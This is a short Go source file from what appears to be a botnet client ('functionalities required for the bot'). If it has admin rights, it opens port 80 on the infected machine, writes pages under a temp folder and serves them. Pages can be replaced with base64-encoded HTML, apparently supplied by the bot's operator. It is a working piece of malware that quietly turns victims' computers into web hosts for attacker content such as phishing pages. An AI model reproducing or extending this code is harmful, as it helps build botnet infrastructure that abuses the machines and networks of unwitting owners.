// Package components icludes functionalities required for the bot
package components

import (
	"net/http"
	"os"
)

func startServer() {
	if isHosting {
		if isAdmin { //Check for Admin
			isopen, _ := openPort(80)
			if isopen { //Try to open port 80
				err := os.MkdirAll(tmpPath+"srv\\", os.FileMode(544)) //Make folder
				if err != nil {
				}
				nHTML, _ := os.Create(tmpPath + "srv\\" + "index.html") //Make defult index
				nHTML.WriteString(rawHTMLPage)
				nHTML.Close()
				go srvHandle() //start webserver
			}
		}
	}
}

func editPage(name string, html string) {
	err := deleteFile(tmpPath + "srv\\" + name) //Delete old
	if err != nil {
	}
	nHTML, _ := os.Create(tmpPath + "srv\\" + name) //write new
	nHTML.WriteString(base64Decode(html))
	nHTML.Close()
}

func srvHandle() {
	// newDebugUpdate("Hosting Webserver.")
	http.ListenAndServe(":80", http.FileServer(http.Dir(tmpPath+"srv/")))
}
